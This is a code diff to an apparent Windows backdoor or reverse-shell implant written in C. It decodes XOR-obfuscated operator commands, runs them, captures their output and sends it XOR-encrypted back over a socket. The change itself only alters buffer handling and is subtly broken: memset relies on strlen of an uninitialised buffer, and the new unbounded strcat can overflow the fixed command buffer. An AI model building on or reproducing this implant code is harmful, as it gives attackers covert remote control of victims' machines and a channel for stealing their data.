@@ -112,6 +112,8 @@ int main(void) {
 
 		
 				char command[12000]; // Buffer to cat multiline output into	
+				memset(command, '\0', strlen(command));
+
 				char* argsop = split(xorbuf, " ");
 				
 				// Cat operator supplied command onto command prefix
@@ -128,12 +130,10 @@ int main(void) {
 
         				while (ReadFile(hOutputRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0) {
             					
-						printf("%s\n", buffer);
-            					strncat(command, buffer, strlen(buffer));
+            					strcat(command, buffer);
 						memset(buffer, '\0', strlen(buffer));
         				}
-
-					//strncat(command, reset, strlen(reset));
+					
 					char* xordata = XOR(command, key, strlen(command), keylen);
 					send(sock, xordata, strlen(command), 0);
 					free(xordata);
